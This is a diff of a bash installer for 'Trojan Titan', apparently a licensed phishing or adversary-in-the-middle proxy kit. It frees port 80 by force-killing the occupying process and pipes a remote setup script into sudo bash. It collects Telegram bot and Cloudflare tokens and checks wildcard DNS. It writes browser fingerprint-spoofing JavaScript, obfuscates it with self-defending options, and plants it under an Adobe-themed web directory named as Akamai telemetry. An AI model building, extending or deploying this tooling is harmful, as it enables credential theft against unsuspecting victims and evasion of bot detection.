@@ -1,5 +1,5 @@
 #!/bin/bash
-# 🏛️ TROJAN - MASTER DEPLOYMENT (V15.0)
+# 🏛️ TROJAN - TITAN DEPLOYMENT (V15.1)
 # --------------------------------------------------------
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -19,58 +19,73 @@ show_header() {
     echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
 }
 
-# --- 1. PORT 80 INTELLIGENT MONITOR ---
+# --- 1. PORT 80 CONFLICT MONITOR ---
 show_header
-echo -e "${CYAN}[...] Scanning Network Ports...${NC}"
+echo -e "${CYAN}[...] Scanning Port 80 Status...${NC}"
 CHECK_80=$(sudo lsof -t -i:80)
 if [ ! -z "$CHECK_80" ]; then
-    echo -e "${YELLOW}[!] Port 80 is currently occupied by PID: $CHECK_80${NC}"
-    echo -e "${PURPLE}Note: Trojan needs Port 80 for SSL Handshakes & Clean Redirection.${NC}"
-    read -p "Would you like to kill the conflicting process now? (y/n): " KILL_CONFIRM
-    if [[ "$KILL_CONFIRM" == "y" ]]; then
+    echo -e "${YELLOW}[!] PORT 80 BLOCKED BY PID: $CHECK_80${NC}"
+    echo -e "${PURPLE}Trojan requires Port 80 to manage the initial HTTP Handshake and generate SSL certificates via Let's Encrypt.${NC}"
+    read -p "Kill the process to allow Trojan to take control? (y/n): " KILL_IT
+    if [[ "$KILL_IT" == "y" ]]; then
         sudo kill -9 $CHECK_80
         echo -e "${GREEN}[success] Port 80 Released.${NC}"
     else
-        echo -e "${RED}[error] Cannot proceed while Port 80 is locked. Exiting.${NC}"
+        echo -e "${RED}[!] Error: Port 80 must be free for Trojan to function. Exiting.${NC}"
         exit 1
     fi
 fi
 
-# --- 2. SYSTEM PRE-FLIGHT (NODE FIX INCLUDED) ---
-DEPS=(curl dig php screen jq nodejs npm)
+# --- 2. SYSTEM PRE-FLIGHT (NODEJS 20 UPGRADE) ---
+echo -e "${CYAN}[...] Validating System Dependencies...${NC}"
+if ! command -v node &> /dev/null || [[ $(node -v | cut -d'.' -f1) != "v20" ]]; then
+    echo -e "${YELLOW}[!] Updating Node.js to v20 (LTS) for Obfuscator compatibility...${NC}"
+    curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - &> /dev/null
+    sudo apt-get install -y nodejs &> /dev/null
+fi
+DEPS=(curl dig php screen jq npm)
 for dep in "${DEPS[@]}"; do
-    if ! command -v $dep &> /dev/null; then
-        sudo apt-get update -y && sudo apt-get install -y curl dnsutils php-cli screen jq nodejs npm
-    fi
+    command -v $dep &> /dev/null || sudo apt-get install -y $dep &> /dev/null
 done
+command -v javascript-obfuscator &> /dev/null || sudo npm install -g javascript-obfuscator &> /dev/null
 
-# --- 3. THE SECURITY GATE ---
+# --- 3. MASTER LICENSE ---
 MASTER_KEY="TROJAN-PRO-2026"
 read -p "ENTER MASTER LICENSE KEY: " USER_KEY
 [[ $(echo "$USER_KEY" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[!] ACCESS DENIED${NC}"; exit 1; }
 
-# --- 4. VALIDATIONS ---
+# --- 4. VERIFICATIONS (TELEGRAM / CLOUDFLARE / DNS) ---
 while true; do
     read -p "Enter Telegram Bot Token: " TG_TOKEN
-    [[ $(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe") == *"\"ok\":true"* ]] && break || echo -e "${RED}Invalid Bot Token.${NC}"
+    echo -ne "${CYAN}[...] Verifying Bot Connection...${NC}\r"
+    [[ $(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe") == *"\"ok\":true"* ]] && break || echo -e "${RED}[error] Bot Offline.${NC}"
 done
 read -p "Enter Telegram Chat ID: " TG_ID
 
 while true; do
     read -p "Enter Cloudflare API Token: " CF_TOKEN
-    [[ $(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer $CF_TOKEN") == *"\"status\":\"active\""* ]] && break || echo -e "${RED}CF Token Rejected.${NC}"
+    echo -ne "${CYAN}[...] Verifying CF Authentication...${NC}\r"
+    [[ $(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer $CF_TOKEN") == *"\"status\":\"active\""* ]] && break || echo -e "${RED}[error] CF Token Invalid.${NC}"
 done
 
 VPS_IP=$(curl -s https://api.ipify.org)
 while true; do
     read -p "Enter Base Domain: " USER_DOMAIN
+    USER_DOMAIN=$(echo "$USER_DOMAIN" | tr -d '()[] ')
     DNS_RESOLVE=$(dig +short "*.$USER_DOMAIN" | tail -n1)
-    [[ "$DNS_RESOLVE" == "$VPS_IP" ]] && break || echo -e "${RED}DNS Mismatch! Points to [$DNS_RESOLVE].${NC}"
+    # UPDATED DNS CHECK: Allows VPS IP OR Cloudflare Proxy Ranges (104.x / 172.x)
+    if [[ "$DNS_RESOLVE" == "$VPS_IP" ]] || [[ "$DNS_RESOLVE" == 104.* ]] || [[ "$DNS_RESOLVE" == 172.* ]]; then
+        echo -e "${GREEN}[success] DNS Verified (Direct or Proxied).${NC}"
+        break
+    else
+        echo -e "${RED}[error] DNS Mismatch ($DNS_RESOLVE). Ensure A-record points to $VPS_IP.${NC}"
+    fi
 done
 
 read -p "Enter Path Slug: /" USER_SLUG
+CLEAN_SLUG=$(echo "$USER_SLUG" | tr -dc 'a-zA-Z0-9')
 
-# --- 5. POLYMORPHIC AKAMAI TELEMETRY ---
+# --- 5. POLYMORPHIC TELEMETRY ---
 cat << 'EOF' > /tmp/raw_telemetry.js
 (function() {
     setTimeout(function() {
@@ -82,11 +97,10 @@ cat << 'EOF' > /tmp/raw_telemetry.js
             if (p === 37446) return 'Intel(R) Iris(TM) Graphics 6100';
             return getP.apply(this, arguments);
         };
-        console.log("Trojan Telemetry Active.");
+        console.log("Trojan Telemetry: Latency Hook Active.");
     }, 2000);
 })();
 EOF
-# Ensure modern Node.js is used for this
 javascript-obfuscator /tmp/raw_telemetry.js --output /var/www/adobe_gui/js/akamai_fingerprint.js --compact true --self-defending true --string-array true --string-array-encoding 'base64'
 rm /tmp/raw_telemetry.js
 
@@ -117,11 +131,16 @@ cat << EOF > /root/config.json
 }
 EOF
 
-# --- 7. THE TROJAN DASHBOARD (RUN.SH) ---
+# --- 7. TROJAN GHOST TERMINAL (RUN.SH) ---
 cat << 'EOF' > /root/run.sh
 #!/bin/bash
-# (Colors and Header)
-# ...
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+YELLOW='\033[1;33m'
+NC='\033[0m'
 CONFIG="/root/config.json"
 DOMAIN=$(jq -r '.proxyDomain' $CONFIG)
 SLUG=$(jq -r '.slug' $CONFIG)
@@ -156,4 +175,4 @@ EOF
 
 chmod +x /root/run.sh
 sudo ln -sf /root/run.sh /usr/local/bin/Run
-echo -e "${GREEN}[success] Trojan Research Suite Ready. Type 'Run'.${NC}"
+echo -e "${GREEN}[success] Trojan Titan Ready. Port 80 Clean. Type 'Run'.${NC}"
